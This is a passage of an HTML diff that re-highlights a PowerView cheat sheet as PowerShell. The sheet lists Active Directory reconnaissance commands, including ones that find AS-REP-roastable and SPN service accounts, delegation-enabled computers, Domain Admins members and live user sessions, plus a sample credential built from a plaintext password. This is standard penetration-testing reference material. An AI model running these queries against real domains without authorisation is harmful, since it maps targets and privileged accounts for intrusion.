@@ -4938,357 +4938,357 @@
 <hr />
 <p>Load, help, and creds
 - Import PowerView into the current session.
-<div class="language-text highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>Import-Module .\PowerView.ps1
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="nb">Import-Module</span> <span class="p">.\</span><span class="n">PowerView</span><span class="p">.</span><span class="n">ps1</span>
 </span></code></pre></div>
 - Show detailed help for a function.
-<div class="language-text highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>Get-Help Get-DomainUser -Detailed
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="nb">Get-Help</span> <span class="nb">Get-DomainUser</span> <span class="n">-Detailed</span>
 </span></code></pre></div>
 - Build an alternate credential object for any PowerView function.
-<div class="language-text highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>$SecPassword = ConvertTo-SecureString &#39;BurgerBurgerBurger!&#39; -AsPlainText -Force; $Cred = New-Object System.Management.Automation.PSCredential(&#39;TESTLAB\dfm.a&#39;,$SecPassword)
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="nv">$SecPassword</span> <span class="p">=</span> <span class="nb">ConvertTo-SecureString</span> <span class="s1">&#39;BurgerBurgerBurger!&#39;</span> <span class="n">-AsPlainText</span> <span class="n">-Force</span><span class="p">;</span> <span class="nv">$Cred</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">Management</span><span class="p">.</span><span class="n">Automation</span><span class="p">.</span><span class="n">PSCredential</span><span class="p">(</span><span class="s1">&#39;TESTLAB\dfm.a&#39;</span><span class="p">,</span><span class="nv">$SecPassword</span><span class="p">)</span>
 </span></code></pre></div>
 - Test using alternate creds with a domain query.
-<div class="language-text highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>Get-DomainUser -Credential $Cred
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="nb">Get-DomainUser</span> <span class="n">-Credential</span> <span class="nv">$Cred</span>
 </span></code></pre></div></p>
 <p>Domain, forest, DCs, sites
 - Query info about the current domain.
-<div class="language-text highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>Get-Domain
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="nb">Get-Domain</span>
 </span></code></pre></div>
 - Query info about a specified (child) domain.
-<div class="language-text highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>Get-Domain -Domain child.corp.local
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="nb">Get-Domain</span> <span class="n">-Domain</span> <span class="n">child</span><span class="p">.</span><span class="n">corp</span><span class="p">.</span><span class="n">local</span>
 </span></code></pre></div>
 - List domain controllers for the current domain.
-<div class="language-text highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>Get-DomainController
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="nb">Get-DomainController</span>
 </span></code></pre></div>
 - Get forest-level information.
-<div class="language-text highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>Get-Forest
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="nb">Get-Forest</span>
 </span></code></pre></div>
 - List all domains in the forest.
-<div class="language-text highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>Get-ForestDomain
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="nb">Get-ForestDomain</span>
 </span></code></pre></div>
 - List forest trusts.
-<div class="language-text highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>Get-ForestTrust
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a><span class="nb">Get-ForestTrust</span>
 </span></code></pre></div>
 - List domain trusts (like nltest /trusted_domains).
-<div class="language-text highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>Get-DomainTrust
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a><span class="nb">Get-DomainTrust</span>
 </span></code></pre></div>
 - Recursively map reachable domain trusts.
-<div class="language-text highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>Get-DomainTrustMapping
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a><span class="nb">Get-DomainTrustMapping</span>
 </span></code></pre></div>
 - Enumerate AD sites.
-<div class="language-text highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>Get-DomainSite
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a><span class="nb">Get-DomainSite</span>
 </span></code></pre></div>
 - Enumerate AD subnets.
-<div class="language-text highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>Get-DomainSubnet
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a><span class="nb">Get-DomainSubnet</span>
 </span></code></pre></div>
 - List global catalog servers in the forest.
-<div class="language-text highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>Get-ForestGlobalCatalog
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a><span class="nb">Get-ForestGlobalCatalog</span>
 </span></code></pre></div></p>
 <p>Policy (password/Kerberos)
 - Read Kerberos policy from domain policy.
-<div class="language-text highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>(Get-DomainPolicy -Domain corp.local).KerberosPolicy
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a><span class="p">(</span><span class="nb">Get-DomainPolicy</span> <span class="n">-Domain</span> <span class="n">corp</span><span class="p">.</span><span class="n">local</span><span class="p">).</span><span class="n">KerberosPolicy</span>
 </span></code></pre></div>
 - Read password/lockout policy (SystemAccess) from domain policy.
-<div class="language-text highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a>(Get-DomainPolicy -Domain corp.local).SystemAccess
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a><span class="p">(</span><span class="nb">Get-DomainPolicy</span> <span class="n">-Domain</span> <span class="n">corp</span><span class="p">.</span><span class="n">local</span><span class="p">).</span><span class="n">SystemAccess</span>
 </span></code></pre></div></p>
 <p>Users (filters, UAC, SPN/AS-REP)
 - Enumerate users with useful props (UPN, enabled, last logon).
-<div class="language-text highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a>Get-DomainUser -Properties samaccountname,UserPrincipalName,Enabled,lastlogontimestamp
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a><span class="nb">Get-DomainUser</span> <span class="n">-Properties</span> <span class="n">samaccountname</span><span class="p">,</span><span class="n">UserPrincipalName</span><span class="p">,</span><span class="n">Enabled</span><span class="p">,</span><span class="n">lastlogontimestamp</span>
 </span></code></pre></div>
 - Users with passwords not changed in &gt;1 year.
-<div class="language-text highlight"><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a>$Date=(Get-Date).AddYears(-1).ToFileTime(); Get-DomainUser -LDAPFilter &quot;(pwdlastset&lt;=$Date)&quot; -Properties samaccountname,pwdlastset
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a><span class="nv">$Date</span><span class="p">=(</span><span class="nb">Get-Date</span><span class="p">).</span><span class="n">AddYears</span><span class="p">(-</span><span class="n">1</span><span class="p">).</span><span class="n">ToFileTime</span><span class="p">();</span> <span class="nb">Get-DomainUser</span> <span class="n">-LDAPFilter</span> <span class="s2">&quot;(pwdlastset&lt;=$Date)&quot;</span> <span class="n">-Properties</span> <span class="n">samaccountname</span><span class="p">,</span><span class="n">pwdlastset</span>
 </span></code></pre></div>
 - All enabled users (DNs).
-<div class="language-text highlight"><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a>Get-DomainUser -LDAPFilter &quot;(!userAccountControl:1.2.840.113556.1.4.803:=2)&quot; -Properties distinguishedname
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a><span class="nb">Get-DomainUser</span> <span class="n">-LDAPFilter</span> <span class="s2">&quot;(!userAccountControl:1.2.840.113556.1.4.803:=2)&quot;</span> <span class="n">-Properties</span> <span class="n">distinguishedname</span>
 </span></code></pre></div>
 - Enabled users via UAC helper.
-<div class="language-text highlight"><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a>Get-DomainUser -UACFilter NOT_ACCOUNTDISABLE -Properties distinguishedname
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a><span class="nb">Get-DomainUser</span> <span class="n">-UACFilter</span> <span class="n">NOT_ACCOUNTDISABLE</span> <span class="n">-Properties</span> <span class="n">distinguishedname</span>
 </span></code></pre></div>
 - All disabled users (LDAP filter).
-<div class="language-text highlight"><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a>Get-DomainUser -LDAPFilter &quot;(useraccountcontrol:1.2.840.113556.1.4.803:=2)&quot;
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a><span class="nb">Get-DomainUser</span> <span class="n">-LDAPFilter</span> <span class="s2">&quot;(useraccountcontrol:1.2.840.113556.1.4.803:=2)&quot;</span>
 </span></code></pre></div>
 - All disabled users (UAC helper).
-<div class="language-text highlight"><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a>Get-DomainUser -UACFilter ACCOUNTDISABLE
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a><span class="nb">Get-DomainUser</span> <span class="n">-UACFilter</span> <span class="n">ACCOUNTDISABLE</span>
 </span></code></pre></div>
 - Users requiring smart card auth (LDAP filter).
-<div class="language-text highlight"><pre><span></span><code><span id="__span-23-1"><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a>Get-DomainUser -LDAPFilter &quot;(useraccountcontrol:1.2.840.113556.1.4.803:=262144)&quot;
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-23-1"><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a><span class="nb">Get-DomainUser</span> <span class="n">-LDAPFilter</span> <span class="s2">&quot;(useraccountcontrol:1.2.840.113556.1.4.803:=262144)&quot;</span>
 </span></code></pre></div>
 - Users requiring smart card (UAC helper).
-<div class="language-text highlight"><pre><span></span><code><span id="__span-24-1"><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a>Get-DomainUser -UACFilter SMARTCARD_REQUIRED
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-24-1"><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a><span class="nb">Get-DomainUser</span> <span class="n">-UACFilter</span> <span class="n">SMARTCARD_REQUIRED</span>
 </span></code></pre></div>
 - Users NOT requiring smart card (list samaccountname only).
-<div class="language-text highlight"><pre><span></span><code><span id="__span-25-1"><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a>Get-DomainUser -LDAPFilter &quot;(!useraccountcontrol:1.2.840.113556.1.4.803:=262144)&quot; -Properties samaccountname
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-25-1"><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a><span class="nb">Get-DomainUser</span> <span class="n">-LDAPFilter</span> <span class="s2">&quot;(!useraccountcontrol:1.2.840.113556.1.4.803:=262144)&quot;</span> <span class="n">-Properties</span> <span class="n">samaccountname</span>
 </span></code></pre></div>
 - Service accounts (users with SPNs).
-<div class="language-text highlight"><pre><span></span><code><span id="__span-26-1"><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a>Get-DomainUser -SPN
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-26-1"><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a><span class="nb">Get-DomainUser</span> <span class="n">-SPN</span>
 </span></code></pre></div>
 - AS-REP roastable users (no Kerberos preauth).
-<div class="language-text highlight"><pre><span></span><code><span id="__span-27-1"><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a>Get-DomainUser -PreauthNotRequired
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-27-1"><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a><span class="nb">Get-DomainUser</span> <span class="n">-PreauthNotRequired</span>
 </span></code></pre></div>
 - AS-REP roastable via UAC helper.
-<div class="language-text highlight"><pre><span></span><code><span id="__span-28-1"><a id="__codelineno-28-1" name="__codelineno-28-1" href="#__codelineno-28-1"></a>Get-DomainUser -UACFilter DONT_REQ_PREAUTH
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-28-1"><a id="__codelineno-28-1" name="__codelineno-28-1" href="#__codelineno-28-1"></a><span class="nb">Get-DomainUser</span> <span class="n">-UACFilter</span> <span class="n">DONT_REQ_PREAUTH</span>
 </span></code></pre></div>
 - Mix identity types (SID, DN, GUID, name) for user lookup.
-<div class="language-text highlight"><pre><span></span><code><span id="__span-29-1"><a id="__codelineno-29-1" name="__codelineno-29-1" href="#__codelineno-29-1"></a>&#39;S-1-5-21-890171859-3433809279-3366196753-1114&#39;,&#39;CN=dfm,CN=Users,DC=testlab,DC=local&#39;,&#39;4c435dd7-dc58-4b14-9a5e-1fdb0e80d201&#39;,&#39;administrator&#39; | Get-DomainUser -Properties samaccountname,lastlogoff
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-29-1"><a id="__codelineno-29-1" name="__codelineno-29-1" href="#__codelineno-29-1"></a><span class="s1">&#39;S-1-5-21-890171859-3433809279-3366196753-1114&#39;</span><span class="p">,</span><span class="s1">&#39;CN=dfm,CN=Users,DC=testlab,DC=local&#39;</span><span class="p">,</span><span class="s1">&#39;4c435dd7-dc58-4b14-9a5e-1fdb0e80d201&#39;</span><span class="p">,</span><span class="s1">&#39;administrator&#39;</span> <span class="p">|</span> <span class="nb">Get-DomainUser</span> <span class="n">-Properties</span> <span class="n">samaccountname</span><span class="p">,</span><span class="n">lastlogoff</span>
 </span></code></pre></div>
 - Users with sidHistory populated.
-<div class="language-text highlight"><pre><span></span><code><span id="__span-30-1"><a id="__codelineno-30-1" name="__codelineno-30-1" href="#__codelineno-30-1"></a>Get-DomainUser -LDAPFilter &#39;(sidHistory=*)&#39; -Properties samaccountname,sidHistory
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-30-1"><a id="__codelineno-30-1" name="__codelineno-30-1" href="#__codelineno-30-1"></a><span class="nb">Get-DomainUser</span> <span class="n">-LDAPFilter</span> <span class="s1">&#39;(sidHistory=*)&#39;</span> <span class="n">-Properties</span> <span class="n">samaccountname</span><span class="p">,</span><span class="n">sidHistory</span>
 </span></code></pre></div>
 - Service accounts that are (or were) in Domain Admins.
-<div class="language-text highlight"><pre><span></span><code><span id="__span-31-1"><a id="__codelineno-31-1" name="__codelineno-31-1" href="#__codelineno-31-1"></a>Get-DomainUser -SPN | ? {$_.memberOf -match &#39;Domain Admins&#39;}
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-31-1"><a id="__codelineno-31-1" name="__codelineno-31-1" href="#__codelineno-31-1"></a><span class="nb">Get-DomainUser</span> <span class="n">-SPN</span> <span class="p">|</span> <span class="p">?</span> <span class="p">{</span><span class="nv">$_</span><span class="p">.</span><span class="n">memberOf</span> <span class="o">-match</span> <span class="s1">&#39;Domain Admins&#39;</span><span class="p">}</span>
 </span></code></pre></div></p>
 <p>Groups and membership
 - List groups with “admin” in the name.
-<div class="language-text highlight"><pre><span></span><code><span id="__span-32-1"><a id="__codelineno-32-1" name="__codelineno-32-1" href="#__codelineno-32-1"></a>Get-DomainGroup -Identity *admin* -Properties name,distinguishedname
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-32-1"><a id="__codelineno-32-1" name="__codelineno-32-1" href="#__codelineno-32-1"></a><span class="nb">Get-DomainGroup</span> <span class="n">-Identity</span> <span class="p">*</span><span class="n">admin</span><span class="p">*</span> <span class="n">-Properties</span> <span class="n">name</span><span class="p">,</span><span class="n">distinguishedname</span>
 </span></code></pre></div>
 - List protected (AdminSDHolder) groups.
-<div class="language-text highlight"><pre><span></span><code><span id="__span-33-1"><a id="__codelineno-33-1" name="__codelineno-33-1" href="#__codelineno-33-1"></a>Get-DomainGroup -AdminCount -Properties name
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-33-1"><a id="__codelineno-33-1" name="__codelineno-33-1" href="#__codelineno-33-1"></a><span class="nb">Get-DomainGroup</span> <span class="n">-AdminCount</span> <span class="n">-Properties</span> <span class="n">name</span>
 </span></code></pre></div>
 - List groups that don’t have a global scope.
-<div class="language-text highlight"><pre><span></span><code><span id="__span-34-1"><a id="__codelineno-34-1" name="__codelineno-34-1" href="#__codelineno-34-1"></a>Get-DomainGroup -GroupScope NotGlobal -Properties name
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-34-1"><a id="__codelineno-34-1" name="__codelineno-34-1" href="#__codelineno-34-1"></a><span class="nb">Get-DomainGroup</span> <span class="n">-GroupScope</span> <span class="n">NotGlobal</span> <span class="n">-Properties</span> <span class="n">name</span>
 </span></code></pre></div>
 - List all groups a user/group effectively belongs to (tokenGroups).
-<div class="language-text highlight"><pre><span></span><code><span id="__span-35-1"><a id="__codelineno-35-1" name="__codelineno-35-1" href="#__codelineno-35-1"></a>Get-DomainGroup -MemberIdentity jdoe
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-35-1"><a id="__codelineno-35-1" name="__codelineno-35-1" href="#__codelineno-35-1"></a><span class="nb">Get-DomainGroup</span> <span class="n">-MemberIdentity</span> <span class="n">jdoe</span>
 </span></code></pre></div>
 - Same as above with a DN identity.
-<div class="language-text highlight"><pre><span></span><code><span id="__span-36-1"><a id="__codelineno-36-1" name="__codelineno-36-1" href="#__codelineno-36-1"></a>Get-DomainGroup -MemberIdentity &quot;CN=dfm,CN=Users,DC=testlab,DC=local&quot;
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-36-1"><a id="__codelineno-36-1" name="__codelineno-36-1" href="#__codelineno-36-1"></a><span class="nb">Get-DomainGroup</span> <span class="n">-MemberIdentity</span> <span class="s2">&quot;CN=dfm,CN=Users,DC=testlab,DC=local&quot;</span>
 </span></code></pre></div>
 - Recursively enumerate group members of Domain Admins.
-<div class="language-text highlight"><pre><span></span><code><span id="__span-37-1"><a id="__codelineno-37-1" name="__codelineno-37-1" href="#__codelineno-37-1"></a>Get-DomainGroupMember -Identity &quot;Domain Admins&quot; -Recurse
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-37-1"><a id="__codelineno-37-1" name="__codelineno-37-1" href="#__codelineno-37-1"></a><span class="nb">Get-DomainGroupMember</span> <span class="n">-Identity</span> <span class="s2">&quot;Domain Admins&quot;</span> <span class="n">-Recurse</span>
 </span></code></pre></div></p>
 <p>Foreign users/groups (cross-domain)
 - Find users from foreign domains present in this domain.
-<div class="language-text highlight"><pre><span></span><code><span id="__span-38-1"><a id="__codelineno-38-1" name="__codelineno-38-1" href="#__codelineno-38-1"></a>Get-DomainForeignUser
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-38-1"><a id="__codelineno-38-1" name="__codelineno-38-1" href="#__codelineno-38-1"></a><span class="nb">Get-DomainForeignUser</span>
 </span></code></pre></div>
 - Find groups in target domain that have foreign members.
-<div class="language-text highlight"><pre><span></span><code><span id="__span-39-1"><a id="__codelineno-39-1" name="__codelineno-39-1" href="#__codelineno-39-1"></a>Get-DomainForeignGroupMember -Domain target.domain.com
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-39-1"><a id="__codelineno-39-1" name="__codelineno-39-1" href="#__codelineno-39-1"></a><span class="nb">Get-DomainForeignGroupMember</span> <span class="n">-Domain</span> <span class="n">target</span><span class="p">.</span><span class="n">domain</span><span class="p">.</span><span class="n">com</span>
 </span></code></pre></div>
 - List foreignSecurityPrincipals from the GC (for SID/DN correlation).
-<div class="language-text highlight"><pre><span></span><code><span id="__span-40-1"><a id="__codelineno-40-1" name="__codelineno-40-1" href="#__codelineno-40-1"></a>Get-DomainObject -Properties objectsid,distinguishedname -SearchBase &quot;GC://corp.local&quot; -LDAPFilter &#39;(objectclass=foreignSecurityPrincipal)&#39;
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-40-1"><a id="__codelineno-40-1" name="__codelineno-40-1" href="#__codelineno-40-1"></a><span class="nb">Get-DomainObject</span> <span class="n">-Properties</span> <span class="n">objectsid</span><span class="p">,</span><span class="n">distinguishedname</span> <span class="n">-SearchBase</span> <span class="s2">&quot;GC://corp.local&quot;</span> <span class="n">-LDAPFilter</span> <span class="s1">&#39;(objectclass=foreignSecurityPrincipal)&#39;</span>
 </span></code></pre></div></p>
 <p>Computers (targeting, delegation)
 - Inventory computers with helpful props.
-<div class="language-text highlight"><pre><span></span><code><span id="__span-41-1"><a id="__codelineno-41-1" name="__codelineno-41-1" href="#__codelineno-41-1"></a>Get-DomainComputer -Properties name,dnshostname,operatingsystem,lastlogontimestamp
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-41-1"><a id="__codelineno-41-1" name="__codelineno-41-1" href="#__codelineno-41-1"></a><span class="nb">Get-DomainComputer</span> <span class="n">-Properties</span> <span class="n">name</span><span class="p">,</span><span class="n">dnshostname</span><span class="p">,</span><span class="n">operatingsystem</span><span class="p">,</span><span class="n">lastlogontimestamp</span>
 </span></code></pre></div>
 - Filter by OS for servers.
-<div class="language-text highlight"><pre><span></span><code><span id="__span-42-1"><a id="__codelineno-42-1" name="__codelineno-42-1" href="#__codelineno-42-1"></a>Get-DomainComputer -OperatingSystem &quot;*Server*&quot; -Properties name,operatingsystem
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-42-1"><a id="__codelineno-42-1" name="__codelineno-42-1" href="#__codelineno-42-1"></a><span class="nb">Get-DomainComputer</span> <span class="n">-OperatingSystem</span> <span class="s2">&quot;*Server*&quot;</span> <span class="n">-Properties</span> <span class="n">name</span><span class="p">,</span><span class="n">operatingsystem</span>
 </span></code></pre></div>
 - Computers allowing unconstrained delegation.
-<div class="language-text highlight"><pre><span></span><code><span id="__span-43-1"><a id="__codelineno-43-1" name="__codelineno-43-1" href="#__codelineno-43-1"></a>Get-DomainComputer -Unconstrained
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-43-1"><a id="__codelineno-43-1" name="__codelineno-43-1" href="#__codelineno-43-1"></a><span class="nb">Get-DomainComputer</span> <span class="n">-Unconstrained</span>
 </span></code></pre></div>
 - Computers trusted to authenticate for others (constrained delegation).
-<div class="language-text highlight"><pre><span></span><code><span id="__span-44-1"><a id="__codelineno-44-1" name="__codelineno-44-1" href="#__codelineno-44-1"></a>Get-DomainComputer -TrustedToAuth
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-44-1"><a id="__codelineno-44-1" name="__codelineno-44-1" href="#__codelineno-44-1"></a><span class="nb">Get-DomainComputer</span> <span class="n">-TrustedToAuth</span>
 </span></code></pre></div>
 - Computers with specific SPNs (e.g., SQL).
-<div class="language-text highlight"><pre><span></span><code><span id="__span-45-1"><a id="__codelineno-45-1" name="__codelineno-45-1" href="#__codelineno-45-1"></a>Get-DomainComputer -SPN *SQL* -Properties name,serviceprincipalname
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-45-1"><a id="__codelineno-45-1" name="__codelineno-45-1" href="#__codelineno-45-1"></a><span class="nb">Get-DomainComputer</span> <span class="n">-SPN</span> <span class="p">*</span><span class="n">SQL</span><span class="p">*</span> <span class="n">-Properties</span> <span class="n">name</span><span class="p">,</span><span class="n">serviceprincipalname</span>
 </span></code></pre></div>
 - List computers from a specific OU.
-<div class="language-text highlight"><pre><span></span><code><span id="__span-46-1"><a id="__codelineno-46-1" name="__codelineno-46-1" href="#__codelineno-46-1"></a>Get-DomainComputer -SearchBase &quot;LDAP://OU=Servers,DC=corp,DC=local&quot; -Properties dnshostname
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-46-1"><a id="__codelineno-46-1" name="__codelineno-46-1" href="#__codelineno-46-1"></a><span class="nb">Get-DomainComputer</span> <span class="n">-SearchBase</span> <span class="s2">&quot;LDAP://OU=Servers,DC=corp,DC=local&quot;</span> <span class="n">-Properties</span> <span class="n">dnshostname</span>
 </span></code></pre></div></p>
 <p>Sessions, local groups, shares (who/where, not process list)
 - Enumerate SMB sessions on a remote host.
-<div class="language-text highlight"><pre><span></span><code><span id="__span-47-1"><a id="__codelineno-47-1" name="__codelineno-47-1" href="#__codelineno-47-1"></a>Get-NetSession -ComputerName FS01.corp.local
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-47-1"><a id="__codelineno-47-1" name="__codelineno-47-1" href="#__codelineno-47-1"></a><span class="nb">Get-NetSession</span> <span class="n">-ComputerName</span> <span class="n">FS01</span><span class="p">.</span><span class="n">corp</span><span class="p">.</span><span class="n">local</span>
 </span></code></pre></div>
 - Enumerate logged-on users on a host.
-<div class="language-text highlight"><pre><span></span><code><span id="__span-48-1"><a id="__codelineno-48-1" name="__codelineno-48-1" href="#__codelineno-48-1"></a>Get-NetLoggedOn -ComputerName WS01.corp.local
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-48-1"><a id="__codelineno-48-1" name="__codelineno-48-1" href="#__codelineno-48-1"></a><span class="nb">Get-NetLoggedOn</span> <span class="n">-ComputerName</span> <span class="n">WS01</span><span class="p">.</span><span class="n">corp</span><span class="p">.</span><span class="n">local</span>
 </span></code></pre></div>
 - Enumerate current RDP sessions (and source IPs).
-<div class="language-text highlight"><pre><span></span><code><span id="__span-49-1"><a id="__codelineno-49-1" name="__codelineno-49-1" href="#__codelineno-49-1"></a>Get-NetRDPSession -ComputerName WS01.corp.local
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-49-1"><a id="__codelineno-49-1" name="__codelineno-49-1" href="#__codelineno-49-1"></a><span class="nb">Get-NetRDPSession</span> <span class="n">-ComputerName</span> <span class="n">WS01</span><span class="p">.</span><span class="n">corp</span><span class="p">.</span><span class="n">local</span>
 </span></code></pre></div>
 - List local groups on a host.
-<div class="language-text highlight"><pre><span></span><code><span id="__span-50-1"><a id="__codelineno-50-1" name="__codelineno-50-1" href="#__codelineno-50-1"></a>Get-NetLocalGroup -ComputerName WS01
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-50-1"><a id="__codelineno-50-1" name="__codelineno-50-1" href="#__codelineno-50-1"></a><span class="nb">Get-NetLocalGroup</span> <span class="n">-ComputerName</span> <span class="n">WS01</span>
 </span></code></pre></div>
 - List members of a local group (default WinNT provider).
